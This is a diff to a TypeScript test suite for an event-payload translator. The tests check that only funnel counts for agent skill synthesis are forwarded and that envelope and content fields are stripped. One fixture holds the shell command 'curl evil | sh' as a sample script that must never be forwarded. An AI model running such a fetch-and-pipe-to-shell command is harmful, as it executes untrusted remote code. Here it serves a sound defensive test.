@@ -99,33 +99,46 @@ describe("translatePayload — SURFACE-06 skill promote/demote (counts-only, SEC
   });
 });
 
-describe("translatePayload — skill_synthesis_funnel (OBS: why-0-admitted, counts-only)", () => {
-  it("forwards the funnel counts (synthesized/validated/admitted/maxClusterCardinality), strips the envelope", () => {
-    const data = translatePayload("learning:skill_synthesis_funnel", {
+describe("translatePayload — reflect:funnel (OBS: why-0-admitted, counts-only, renamed Phase 226)", () => {
+  it("forwards the funnel counts (synthesized/validated/admitted/maxClusterCardinality + admissionOutcome), strips the envelope", () => {
+    const data = translatePayload("reflect:funnel", {
       agentId: "agent-1",
       synthesized: 2,
       validated: 2,
       admitted: 0,
       maxClusterCardinality: 1,
+      // OBS-1: the funnel magnitudes (counts only) ride the bridged trajectory event.
+      untrustedDrops: 3,
+      nameLengthRejections: 0,
+      skipped: 1,
+      sourceTrajectoryCount: 5,
+      totalSourceChars: 1280,
+      admissionOutcome: "uncorroborated",
       timestamp: 1717171717,
     });
-    expect(data).toEqual({ synthesized: 2, validated: 2, admitted: 0, maxClusterCardinality: 1 });
+    expect(data).toEqual({ synthesized: 2, validated: 2, admitted: 0, maxClusterCardinality: 1, untrustedDrops: 3, nameLengthRejections: 0, skipped: 1, sourceTrajectoryCount: 5, totalSourceChars: 1280, admissionOutcome: "uncorroborated" });
     expect(data.agentId).toBeUndefined();
     expect(data.timestamp).toBeUndefined();
   });
 
   it("never forwards a procedure body/script even if present (content-free invariant)", () => {
-    const data = translatePayload("learning:skill_synthesis_funnel", {
+    const data = translatePayload("reflect:funnel", {
       agentId: "agent-1",
       synthesized: 1,
       validated: 1,
       admitted: 1,
       maxClusterCardinality: 2,
-      body: "the synthesized procedure markdown",
+      untrustedDrops: 0,
+      nameLengthRejections: 0,
+      skipped: 0,
+      sourceTrajectoryCount: 2,
+      totalSourceChars: 640,
+      admissionOutcome: "admitted",
+      body: "the reflected procedure markdown",
       scripts: ["curl evil | sh"],
       timestamp: 1717171717,
     } as Record<string, unknown>);
-    expect(data).toEqual({ synthesized: 1, validated: 1, admitted: 1, maxClusterCardinality: 2 });
+    expect(data).toEqual({ synthesized: 1, validated: 1, admitted: 1, maxClusterCardinality: 2, untrustedDrops: 0, nameLengthRejections: 0, skipped: 0, sourceTrajectoryCount: 2, totalSourceChars: 640, admissionOutcome: "admitted" });
     expect("body" in data).toBe(false);
     expect("scripts" in data).toBe(false);
   });
